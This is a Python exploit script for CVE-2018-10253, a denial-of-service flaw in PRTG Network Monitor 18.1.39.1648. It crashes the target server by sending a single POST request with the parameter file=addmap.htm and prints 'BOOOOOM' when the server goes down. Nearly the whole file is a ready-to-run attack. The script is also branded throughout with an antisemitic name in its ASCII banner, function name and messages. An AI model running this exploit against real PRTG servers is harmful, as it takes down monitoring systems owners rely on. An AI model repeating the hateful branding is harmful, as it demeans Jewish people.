# Exploit Author: Lucas "luriel" Carmo
# Vendor Homepage: https://www.paessler.com/prtg
# Software Link: https://www.paessler.com/download/prtg-download
# Version: 18.1.39.1648
# CVE : CVE-2018-10253
# Post Reference: https://medium.com/stolabs/stack-overflow-jewish-napalm-on-prtg-network-monitoring-56609b0804c5
# http://www.roothc.com.br/stack-overflow-prtg-network-monitoring-jewish-napalm/
 
#!/usr/bin/python
 
import requests
import sys
import os
import re
import socket
 
green = "\033[1;32m"
yellow = &#039;\033[1;33m&#039;
normal = &#039;\033[0;0m&#039;
banner = """
     ██╗███████╗██╗    ██╗██╗███████╗██╗  ██╗    ███╗   ██╗ █████╗ ██████╗  █████╗ ██╗     ███╗   ███╗
     ██║██╔════╝██║    ██║██║██╔════╝██║  ██║    ████╗  ██║██╔══██╗██╔══██╗██╔══██╗██║     ████╗ ████║
     ██║█████╗  ██║ █╗ ██║██║███████╗███████║    ██╔██╗ ██║███████║██████╔╝███████║██║     ██╔████╔██║
██   ██║██╔══╝  ██║███╗██║██║╚════██║██╔══██║    ██║╚██╗██║██╔══██║██╔═══╝ ██╔══██║██║     ██║╚██╔╝██║
╚█████╔╝███████╗╚███╔███╔╝██║███████║██║  ██║    ██║ ╚████║██║  ██║██║     ██║  ██║███████╗██║ ╚═╝ ██║
 ╚════╝ ╚══════╝ ╚══╝╚══╝ ╚═╝╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝
"""
 
 
banner2 = """
                                            Author: @Lucas "luriel" Carmo
"""
 
os.system(&#039;clear&#039;)
 
print(green+banner)
print(yellow+banner2)
print(normal)
 
def check_http(url):
    pattern = re.compile("http://")
    return re.search(pattern, url)
 
def sanitize_url(url):
    if(not check_http(url)):
        return "http://" + url
    return url
 
def check_server(url):
    r = requests.get(url, timeout=4)
    code = r.status_code
 
def send_jewish_payload(url):
    payload = {&#039;file&#039;:&#039;addmap.htm&#039;}
    r = requests.post(url, params=payload)
 
def main():
    try:
        if len(sys.argv) <= 3 and len (sys.argv) >= 2:
            try:
                url = sanitize_url(sys.argv[1])
                print(&#039; [#] LOADING!&#039;)
                if (check_server(url) != 404):
                    send_jewish_payload(url)
                else:
                    print(&#039; [!] Server shutdown or not found&#039;)
            except requests.exceptions.ConnectionError:
                print(&#039; [~] BOOOOOM! PRTG Server has been exploded!&#039;)
            except requests.exceptions.InvalidURL:
                print(&#039; [!] Invalid URL&#039;)
            except requests.exceptions.Timeout:
                print(&#039; [!] Connection Timeout\n&#039;)
        else:
            print(&#039;Example usage: ./&#039;+sys.argv[0]+&#039; http://192.168.0.10/index.htm&#039;)
    except KeyboardInterrupt:
        print(&#039; [!] Jewish Napalm Canceled;.....[./]&#039;)
if __name__ == &#039;__main__&#039;:
    main()

